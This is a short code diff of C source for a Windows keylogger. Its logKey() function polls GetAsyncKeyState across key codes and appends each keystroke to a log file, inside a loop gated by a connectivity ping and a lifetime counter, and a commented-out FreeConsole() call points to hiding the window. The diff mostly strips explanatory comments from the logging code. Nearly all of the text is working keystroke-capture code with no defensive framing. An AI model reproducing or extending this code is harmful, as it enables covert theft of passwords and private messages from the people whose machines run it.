@@ -12,13 +12,13 @@ int age = 0;
 int main() {
 
 	//FreeConsole();
-	//int number;
+
 	if (!system("ping www.google.com -n 1")) {
 		printf("Has Connection");
 		//scanf_s("%d", &number);
 		int age = 1;
 		while (1) {
-			////////////****LOG KEY****////////////
+
 			if (age <= LIFE_TIME) {
 				logKey();
 			}
@@ -37,11 +37,11 @@ void logKey() {
 	FILE *file;
 	unsigned short ch = 0, i = 0, j = 1; // :)
 
-	while (j < 500) { ///loop runs for approx. 25 seconds
+	while (j < 500) { 
 		ch = 1;
 		while (ch < 250) {
 			for (i = 0; i < 50; i++, ch++) {
-				if (GetAsyncKeyState(ch) == -32767) { ///key is stroke
+				if (GetAsyncKeyState(ch) == -32767) { 
 					file = fopen(FILE_NAME, "a");
 					fprintf(file, "%d ", ch);
 					fclose(file);
